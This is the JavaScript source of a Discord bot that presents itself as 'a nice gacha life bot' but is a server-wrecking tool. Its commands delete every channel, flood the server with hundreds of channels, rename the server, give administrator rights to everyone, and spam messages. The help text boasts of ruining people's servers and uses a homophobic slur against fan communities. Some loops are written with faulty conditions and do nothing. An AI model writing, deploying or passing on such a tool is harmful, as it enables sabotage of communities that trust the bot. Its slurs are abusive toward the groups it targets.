const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = '$';

client.on("ready", () => { 
    console.log(`ready for destroy ppl's days`)
    console.log(`Defoko V3`)
    client.user.setActivity(`Defoco V3 - Prefix: $ [a nice gacha life bot]`);
});

client.on("message", async (message) => {
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const comando = args.shift().toLowerCase();

    const server = message.guild.channels;

    switch(comando) {
        case "yeet":
            message.delete();
            if(message.guild.channels > 500) return message.channel.send(`too much text channels`)
            let i;
            if(!args.slice(0).join(' ')){ 
                message.guild.setName('haha admin go grr -ags')
                for(i = 0; i < 499; i++){
                    message.guild.createChannel('haha admin go grr', 'text')
                    message.guild.createChannel('haha admin go grr', 'voice')
                }
            } else {
                message.guild.setName(`${args.slice(0).join(' ')}`)
                for(i = 0; i < 499; i++){
                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text')
                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
                }
            }
            for(i = 0; i == 250; i++) message.guild.createRole('NOOT NOOT')
        break;
        case "del":
            message.delete();
            server.deleteAll();
            message.guild.createChannel('lmaoo', 'text')
        break;
        case "admall":
            message.delete();
            message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
        break;
        case "servername":
            message.delete();
            if(!args.slice(0).join(' ')) return message.channel.send("give a name, dumbass")
            message.guild.setName(`${args.slice(0).join(' ')}`)
        break;
        case "help":
            message.delete();
            const help = [`Tefoco V3\n`,
            "prefix: $",
            "$yeet (optional name for the things)- makes a lot of text channels and vcs, and roles, also changes the server's name",
            "$del - yeets all the channels and only leaves one",
            "$admall - self explanatory",
            "$servername (new server name) - self explanatory",
            `$help - bruhhh\n`,
            "Bot by paradino, making gachafags and furries lifes worse"]
            message.author.send(`${help.slice(0).join(`\n`)}`).catch(() => message.channel.send(`enable yo dms dumbass`))
        break;
        case "spam":
            if(!args.slice(0).join(' ')) return message.channel.send('what am i supposed to spam bruhh')
            for(let spam = 0; spam == 400; spam++) message.channel.send(`${args.slice(0).join(' ')}`)
        break;
    }
});

client.login(process.env.token);

//para de olhar aqui poha
//- mene paradino